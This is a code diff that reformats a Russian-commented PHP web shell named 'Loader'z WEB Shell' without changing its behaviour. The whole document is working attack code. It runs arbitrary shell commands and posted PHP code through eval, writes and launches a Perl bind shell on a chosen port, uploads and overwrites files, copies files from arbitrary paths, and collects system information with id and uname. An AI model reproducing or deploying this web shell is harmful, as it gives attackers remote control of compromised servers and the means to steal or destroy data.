@@ -1,4 +1,4 @@
-<?
+<?php
 error_reporting(0);
 /* Loader'z WEB Shell v 0.1.0.2 {15 августа 2005}
 Вот какие он поддерживает функции.
@@ -88,8 +88,8 @@ $files = '';
 
 
 
-if (isset($_POST['port'])){
-$bind = "
+if (isset($_POST['port'])) {
+    $bind = "
 #!/usr/bin/perl
 
 \$port = {$_POST['port']};
@@ -115,77 +115,76 @@ while(1)
 	}
 	close X;
 }
-";}
+";
+}
 
-function decode($buffer){
-
-return  convert_cyr_string ($buffer, 'd', 'w');
-
+function decode($buffer)
+{
+    return  convert_cyr_string($buffer, 'd', 'w');
 }
 
 
 
 function execute($com)
 {
-
- if (!empty($com))
- {
-  if(function_exists('exec'))
-   {
-    exec($com,$arr);
-   echo implode('
-',$arr);
-   }
-  elseif(function_exists('shell_exec'))
-   {
-    echo shell_exec($com);
-    
-    
-   }
-  elseif(function_exists('system'))
-{
-
-    echo system($com);
-}
-  elseif(function_exists('passthru'))
-   {
-
-    echo passthru($com);
-
-   }
-}
-
+    if (!empty($com)) {
+        if (function_exists('exec')) {
+            exec($com, $arr);
+            echo implode('
+', $arr);
+        } elseif (function_exists('shell_exec')) {
+            echo shell_exec($com);
+        } elseif (function_exists('system')) {
+            echo system($com);
+        } elseif (function_exists('passthru')) {
+            echo passthru($com);
+        }
+    }
 }
 
 
 function perms($mode)
 {
-
-if( $mode & 0x1000 ) { $type='p'; }
-else if( $mode & 0x2000 ) { $type='c'; }
-else if( $mode & 0x4000 ) { $type='d'; }
-else if( $mode & 0x6000 ) { $type='b'; }
-else if( $mode & 0x8000 ) { $type='-'; }
-else if( $mode & 0xA000 ) { $type='l'; }
-else if( $mode & 0xC000 ) { $type='s'; }
-else $type='u';
-$owner["read"] = ($mode & 00400) ? 'r' : '-';
-$owner["write"] = ($mode & 00200) ? 'w' : '-';
-$owner["execute"] = ($mode & 00100) ? 'x' : '-';
-$group["read"] = ($mode & 00040) ? 'r' : '-';
-$group["write"] = ($mode & 00020) ? 'w' : '-';
-$group["execute"] = ($mode & 00010) ? 'x' : '-';
-$world["read"] = ($mode & 00004) ? 'r' : '-';
-$world["write"] = ($mode & 00002) ? 'w' : '-';
-$world["execute"] = ($mode & 00001) ? 'x' : '-';
-if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
-if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
-if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
-$s=sprintf("%1s", $type);
-$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
-$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
-$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
-return trim($s);
+    if ($mode & 0x1000) {
+        $type='p';
+    } elseif ($mode & 0x2000) {
+        $type='c';
+    } elseif ($mode & 0x4000) {
+        $type='d';
+    } elseif ($mode & 0x6000) {
+        $type='b';
+    } elseif ($mode & 0x8000) {
+        $type='-';
+    } elseif ($mode & 0xA000) {
+        $type='l';
+    } elseif ($mode & 0xC000) {
+        $type='s';
+    } else {
+        $type='u';
+    }
+    $owner["read"] = ($mode & 00400) ? 'r' : '-';
+    $owner["write"] = ($mode & 00200) ? 'w' : '-';
+    $owner["execute"] = ($mode & 00100) ? 'x' : '-';
+    $group["read"] = ($mode & 00040) ? 'r' : '-';
+    $group["write"] = ($mode & 00020) ? 'w' : '-';
+    $group["execute"] = ($mode & 00010) ? 'x' : '-';
+    $world["read"] = ($mode & 00004) ? 'r' : '-';
+    $world["write"] = ($mode & 00002) ? 'w' : '-';
+    $world["execute"] = ($mode & 00001) ? 'x' : '-';
+    if ($mode & 0x800) {
+        $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
+    }
+    if ($mode & 0x400) {
+        $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
+    }
+    if ($mode & 0x200) {
+        $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
+    }
+    $s=sprintf("%1s", $type);
+    $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
+    $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
+    $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
+    return trim($s);
 }
 
 
@@ -195,12 +194,11 @@ return trim($s);
 /*Определяем тип системы*/
 $servsoft = $_SERVER['SERVER_SOFTWARE'];
 
-if (ereg("Win32", $servsoft, $reg)){
-$sertype = "winda";
+if (ereg("Win32", $servsoft, $reg)) {
+    $sertype = "winda";
+} else {
+    $sertype = "other";
 }
-else
-{
-$sertype = "other";}
 
 
 
@@ -212,173 +210,156 @@ echo "Total space " . (int)(disk_total_space(getcwd())/(1024*1024)) . "Mb " . "F
 
 
 
-if (ini_get('safe_mode') <> 1){
-if ($sertype == "winda"){
+if (ini_get('safe_mode') <> 1) {
+    if ($sertype == "winda") {
+        ob_start('decode');
+        echo "OS: ";
+        echo execute("ver") . "<br>";
+        ob_end_flush();
+    }
 
-ob_start('decode');
-echo "OS: ";
-echo execute("ver") . "<br>";
-ob_end_flush();
-}
+    if ($sertype == "other") {
+        echo "id:";
 
-if ($sertype == "other"){
-echo "id:";
+        echo execute("id") . "<br>";
+        echo "uname:" . execute('uname -a') . "<br>";
+    }
+} else {
+    if ($sertype == "winda") {
+        echo "OS: " . php_uname() . "<br>";
+    }
 
-echo execute("id") . "<br>";
-echo "uname:" . execute('uname -a') . "<br>";
-}}
-else{
-if ($sertype == "winda"){
+    if ($sertype == "other") {
+        echo "id:";
 
-echo "OS: " . php_uname() . "<br>";
-
-}
-
-if ($sertype == "other"){
-echo "id:";
-
-echo execute("id") . "<br>";
-echo "OS:" . php_uname() . "<br>";
-}
+        echo execute("id") . "<br>";
+        echo "OS:" . php_uname() . "<br>";
+    }
 }
 
 echo 'User: ' .get_current_user() . '<br>';
 
 
 
-if (ini_get("open_basedir")){
-echo "open_basedir: " . ini_get("open_basedir");}
-
-
-if (ini_get('safe_mode') == 1){
-echo "<font size=\"3\"color=\"#cc0000\">Safe mode :(";
-
-if (ini_get('safe_mode_include_dir')){
-echo "Including from here: " . ini_get('safe_mode_include_dir'); }
-if (ini_get('safe_mode_exec_dir')){
-echo " Exec here: " . ini_get('safe_mode_exec_dir');
-}
-echo "</font>";}
-
-
-
-
-if(isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "")
-{
-copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
+if (ini_get("open_basedir")) {
+    echo "open_basedir: " . ini_get("open_basedir");
 }
 
-if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))
 
-{
-$data = implode("", file($_POST['filefrom']));
-$fp = fopen($_POST['fileto'], "wb");
-fputs($fp, $data);
-$ok = fclose($fp);
-if($ok)
-{
-$size = filesize($_POST['fileto'])/1024;
-$sizef = sprintf("%.2f", $size);
-print "<center><div id=logostrip>Download - OK. (".$sizef."кБ)</div></center>";
-}
-else
-{
-print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
-}
+if (ini_get('safe_mode') == 1) {
+    echo "<font size=\"3\"color=\"#cc0000\">Safe mode :(";
+
+    if (ini_get('safe_mode_include_dir')) {
+        echo "Including from here: " . ini_get('safe_mode_include_dir');
+    }
+    if (ini_get('safe_mode_exec_dir')) {
+        echo " Exec here: " . ini_get('safe_mode_exec_dir');
+    }
+    echo "</font>";
 }
 
-if (isset($_POST['installbind'])){
-
-if (is_dir($_POST['installpath']) == true){
-chdir($_POST['installpath']);
-$_POST['installpath'] = "temp.pl";}
 
 
-$fp = fopen($_POST['installpath'], "w");
-fwrite($fp, $bind);
-fclose($fp);
 
-exec("perl " . $_POST['installpath']);
-chdir($dir);
+if (isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "") {
+    copy($HTTP_POST_FILES["userfile"]["tmp_name"], $HTTP_POST_FILES["userfile"]["name"]);
+}
+
+if ((isset($_POST['fileto']))||(isset($_POST['filefrom']))) {
+    $data = implode("", file($_POST['filefrom']));
+    $fp = fopen($_POST['fileto'], "wb");
+    fputs($fp, $data);
+    $ok = fclose($fp);
+    if ($ok) {
+        $size = filesize($_POST['fileto'])/1024;
+        $sizef = sprintf("%.2f", $size);
+        print "<center><div id=logostrip>Download - OK. (".$sizef."кБ)</div></center>";
+    } else {
+        print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
+    }
+}
+
+if (isset($_POST['installbind'])) {
+    if (is_dir($_POST['installpath']) == true) {
+        chdir($_POST['installpath']);
+        $_POST['installpath'] = "temp.pl";
+    }
 
 
+    $fp = fopen($_POST['installpath'], "w");
+    fwrite($fp, $bind);
+    fclose($fp);
+
+    exec("perl " . $_POST['installpath']);
+    chdir($dir);
 }
 
 
 @$ef = stripslashes($_POST['editfile']);
-if ($ef){
-$fp = fopen($ef, "r");
-$filearr = file($ef);
+if ($ef) {
+    $fp = fopen($ef, "r");
+    $filearr = file($ef);
 
 
 
-$string = '';
-$content = '';
-foreach ($filearr as $string){
-$string = str_replace("<" , "&lt;" , $string);
-$string = str_replace(">" , "&gt;" , $string);
-$content = $content . $string;
-}
+    $string = '';
+    $content = '';
+    foreach ($filearr as $string) {
+        $string = str_replace("<", "&lt;", $string);
+        $string = str_replace(">", "&gt;", $string);
+        $content = $content . $string;
+    }
 
-echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
+    echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
 <input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
 <input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
 <input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
-fclose($fp);
+    fclose($fp);
 }
 
-if(isset($_POST['savefile'])){
-
-$fp = fopen($_POST['savefile'], "w");
-$content = stripslashes($content);
-fwrite($fp, $content);
-fclose($fp);
-echo "<center><div id=logostrip>Successfully saved!</div></center>";
-
+if (isset($_POST['savefile'])) {
+    $fp = fopen($_POST['savefile'], "w");
+    $content = stripslashes($content);
+    fwrite($fp, $content);
+    fclose($fp);
+    echo "<center><div id=logostrip>Successfully saved!</div></center>";
 }
 
 
-if (isset($_POST['php'])){
-
-echo "<center><div id=logostrip>PHP code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
+if (isset($_POST['php'])) {
+    echo "<center><div id=logostrip>PHP code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
 <input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
 }
 
 
 
-if(isset($_POST['phpcode'])){
-
-echo "<center><div id=logostrip>Results of PHP execution<br><br>";
-@eval(stripslashes($_POST['phpcode']));
-echo "</div></center>";
-
-
+if (isset($_POST['phpcode'])) {
+    echo "<center><div id=logostrip>Results of PHP execution<br><br>";
+    @eval(stripslashes($_POST['phpcode']));
+    echo "</div></center>";
 }
 
 
-if ($cmd){
+if ($cmd) {
+    if ($sertype == "winda") {
+        ob_start();
+        execute($cmd);
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    } else {
+        ob_start();
+        echo decode(execute($cmd));
+        $buffer = "";
+        $buffer = ob_get_contents();
+        ob_end_clean();
+    }
 
-if($sertype == "winda"){
-ob_start();
-execute($cmd);
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-else{
-ob_start();
-echo decode(execute($cmd));
-$buffer = "";
-$buffer = ob_get_contents();
-ob_end_clean();
-}
-
-if (trim($buffer)){
-echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
-echo decode($buffer);
-echo "</textarea></center></div>";
-}
-
+    if (trim($buffer)) {
+        echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
+        echo decode($buffer);
+        echo "</textarea></center></div>";
+    }
 }
 $arr = array();
 
@@ -390,50 +371,41 @@ sort($arr);
 echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";
 
 foreach ($arr as $filename) {
+    if ($filename != "." and $filename != "..") {
+        if (is_dir($filename) == true) {
+            $directory = "";
+            $directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
+            if (is_writable($filename) == true) {
+                $directory = $directory . "<td>Yes</td>";
+            } else {
+                $directory = $directory . "<td>No</td>";
+            }
 
-if ($filename != "." and $filename != ".."){
+            if (is_readable($filename) == true) {
+                $directory = $directory . "<td>Yes</td>";
+            } else {
+                $directory = $directory . "<td>No</td>";
+            }
+            $dires = $dires . $directory;
+        }
 
-if (is_dir($filename) == true){
-$directory = "";
-$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-if (is_writable($filename) == true){
-$directory = $directory . "<td>Yes</td>";}
-else{
-$directory = $directory . "<td>No</td>";
+        if (is_file($filename) == true) {
+            $file = "";
+            $file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
+            if (is_writable($filename) == true) {
+                $file = $file . "<td>Yes</td>";
+            } else {
+                $file = $file . "<td>No</td>";
+            }
 
-}
-
-if (is_readable($filename) == true){
-$directory = $directory . "<td>Yes</td>";}
-else{
-$directory = $directory . "<td>No</td>";
-}
-$dires = $dires . $directory;
-}
-
-if (is_file($filename) == true){
-$file = "";
-$file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-if (is_writable($filename) == true){
-$file = $file . "<td>Yes</td>";}
-else{
-$file = $file . "<td>No</td>";
-}
-
-if (is_readable($filename) == true){
-$file = $file . "<td>Yes</td></td></tr>";}
-else{
-$file = $file . "<td>No</td></td></tr>";
-}
-$files = $files . $file;
-}
-
-
-
-}
-
-
-
+            if (is_readable($filename) == true) {
+                $file = $file . "<td>Yes</td></td></tr>";
+            } else {
+                $file = $file . "<td>No</td></td></tr>";
+            }
+            $files = $files . $file;
+        }
+    }
 }
 echo $dires;
 echo $files;
